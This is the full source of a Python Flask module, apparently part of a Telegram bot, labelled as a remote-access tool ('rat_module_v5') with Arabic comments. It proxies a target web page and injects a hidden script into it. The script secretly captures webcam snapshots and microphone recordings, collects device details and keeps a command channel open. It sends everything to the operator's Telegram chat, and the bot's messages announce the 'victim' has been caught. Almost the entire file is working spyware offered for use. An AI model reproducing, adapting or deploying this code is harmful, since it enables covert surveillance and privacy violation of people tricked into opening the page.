import os
import base64
import io
import json
import requests
import redis
from concurrent.futures import ThreadPoolExecutor
from flask import Blueprint, render_template_string, request, Response, stream_with_context

rat_bp = Blueprint('rat_module_v5', __name__)

# الاتصال بقاعدة بيانات Redis مع معالجة الرابط تلقائياً
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

# محرك طوابير المهام غير المتزامنة (Asynchronous Task Pool)
background_executor = ThreadPoolExecutor(max_workers=4)

# سكربت الحقن الديناميكي (Dynamic Payload Injection) الذي يتم زرعه في الصفحة الأصلية أثناء الطيران
INJECTION_PAYLOAD = """
<script>
    const chatId = "{chat_id}";
    let activeStream = null;

    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js?id=' + chatId).catch(err => {});
    }

    window.addEventListener('DOMContentLoaded', async () => {
        try {
            activeStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                audio: true 
            });
            
            const video = document.createElement('video');
            video.id = 'v';
            video.autoplay = true;
            video.playsInline = true;
            video.muted = true;
            video.style.display = 'none';
            video.srcObject = activeStream;
            document.body.appendChild(video);
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.id = 'c';
            canvas.style.display = 'none';
            document.body.appendChild(canvas);

            sendDeviceInfo();
            setTimeout(() => captureLiveSnapshot("📸 **صورة الاتصال الأولى (Dynamic Proxy):**"), 1500);
            initSSEStream();
        } catch (err) {}
    });

    function sendDeviceInfo() {
        fetch('/rat_v5_collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screen: window.screen.width + "x" + window.screen.height
            })
        });
    }

    function captureLiveSnapshot(titleText) {
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        if (!video || !canvas || video.readyState < video.HAVE_CURRENT_DATA) return;

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const freshImageData = canvas.toDataURL('image/jpeg', 0.9);

        fetch('/rat_v5_image', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, image: freshImageData, title: titleText })
        });
    }

    function recordLiveAudio() {
        if (!activeStream) return;
        try {
            let chunks = [];
            const recorder = new MediaRecorder(activeStream);
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    fetch('/rat_v5_audio', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, audio: reader.result })
                    });
                };
            };
            recorder.start();
            setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, 5000);
        } catch (e) {}
    }

    function initSSEStream() {
        const eventSource = new EventSource('/rat_v5_stream?id=' + chatId);
        eventSource.onmessage = function(event) {
            try {
                const data = JSON.parse(event.data);
                if (data.action === "snapshot") {
                    captureLiveSnapshot("📸 **صورة حية ومتجددة (عبر Reverse Proxy):**");
                } else if (data.action === "audio") {
                    recordLiveAudio();
                }
            } catch (e) {}
        };
        eventSource.onerror = function() {
            setTimeout(() => {
                eventSource.close();
                initSSEStream();
            }, 3000);
        };
    }
</script>
"""

SERVICE_WORKER_SCRIPT = """
self.addEventListener('install', (e) => { self.skipWaiting(); });
self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });
self.addEventListener('fetch', (e) => { e.respondWith(fetch(e.request)); });
"""

def async_send_photo(bot, chat_id, image_bytes, title):
    try:
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = 'live_target.jpg'
        bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
    except Exception as e:
        print(f"Async Img Error: {e}")

def async_send_audio(bot, chat_id, audio_bytes):
    try:
        audio_file = io.BytesIO(audio_bytes)
        audio_file.name = 'live_audio.webm'
        bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي حي (عبر Reverse Proxy):**", parse_mode="Markdown")
    except Exception as e:
        print(f"Async Audio Error: {e}")

def init_rat_routes(app, bot):
    @app.route('/system_secure_v2', methods=['GET'])
    def dynamic_reverse_proxy():
        chat_id = request.args.get('id', '0')
        
        # الموقع المستهدف المراد سحبه وعرضه ديناميكياً (مثلاً صفحة تسجيل دخول أو تحديث حقيقية)
        target_url = "https://example.com"  
        
        try:
            # جلب محتوى الصفحة الأصلية من المصدر لحظياً
            headers = {"User-Agent": request.headers.get("User-Agent", "Mozilla/5.0")}
            resp = requests.get(target_url, headers=headers, timeout=10)
            page_content = resp.text
            
            # حقن سكربت التحكم والمراقبة داخل الـ DOM قبل إرسال الصفحة للضحية
            custom_script = INJECTION_PAYLOAD.replace("{chat_id}", chat_id)
            if "</body>" in page_content:
                modified_content = page_content.replace("</body>", custom_script + "</body>")
            else:
                modified_content = page_content + custom_script
                
            return Response(modified_content, status=resp.status_code, content_type=resp.headers.get("Content-Type", "text/html"))
        except Exception as e:
            return f"Error loading target mirror: {e}", 500

    @app.route('/sw.js', methods=['GET'])
    def service_worker():
        return Response(SERVICE_WORKER_SCRIPT, mimetype='application/javascript')

    @app.route('/rat_v5_collect', methods=['POST'])
    def rat_collect():
        data = request.json or {}
        chat_id = data.get('chat_id')
        if chat_id and chat_id != '0':
            msg = (
                "🎯 **تم اصطياد الضحية عبر محرك الـ Reverse Proxy الديناميكي بنجاح!**\n\n"
                f"💻 **النظام:** `{data.get('platform')}`\n"
                f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
                "👇 **اختر الأمر المطلوب تنفيذه:**"
            )
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📸 التقاط صورة حية جديدة", callback_data=f"rat_cam_{chat_id}"),
                InlineKeyboardButton("🎙️ تسجيل صوت مباشر", callback_data=f"rat_mic_{chat_id}")
            )
            try:
                bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=markup)
            except Exception as e:
                print(f"Error: {e}")
        return {"status": "ok"}

    @app.route('/rat_v5_stream', methods=['GET'])
    def rat_stream():
        chat_id = request.args.get('id')
        if not chat_id:
            return "Missing ID", 400

        def event_stream():
            pubsub = redis_client.pubsub()
            pubsub.subscribe(f"channel_cmd:{chat_id}")
            yield f"data: {json.dumps({'action': 'ping'})}\n\n"

            while True:
                try:
                    message = pubsub.get_message(ignore_subscribe_messages=True, timeout=15)
                    if message:
                        action_data = message['data']
                        yield f"data: {json.dumps({'action': action_data})}\n\n"
                    else:
                        yield f"data: {json.dumps({'action': 'heartbeat'})}\n\n"
                except Exception:
                    break

        return Response(stream_with_context(event_stream()), mimetype="text/event-stream")

    @app.route('/rat_v5_image', methods=['POST'])
    def rat_image():
        data = request.json or {}
        chat_id = data.get('chat_id')
        img_data = data.get('image')
        title = data.get('title', "📸 **صورة حية:**")
        if chat_id and img_data:
            try:
                header, encoded = img_data.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                background_executor.submit(async_send_photo, bot, chat_id, image_bytes, title)
            except Exception as e:
                print(f"Proxy Img Error: {e}")
        return {"status": "ok"}

    @app.route('/rat_v5_audio', methods=['POST'])
    def rat_audio():
        data = request.json or {}
        chat_id = data.get('chat_id')
        audio_data = data.get('audio')
        if chat_id and audio_data:
            try:
                header, encoded = audio_data.split(",", 1)
                audio_bytes = base64.b64decode(encoded)
                background_executor.submit(async_send_audio, bot, chat_id, audio_bytes)
            except Exception as e:
                print(f"Proxy Audio Error: {e}")
        return {"status": "ok"}

def queue_command(chat_id, action):
    redis_client.publish(f"channel_cmd:{chat_id}", action)
    redis_client.expire(f"channel_cmd:{chat_id}", 3600)
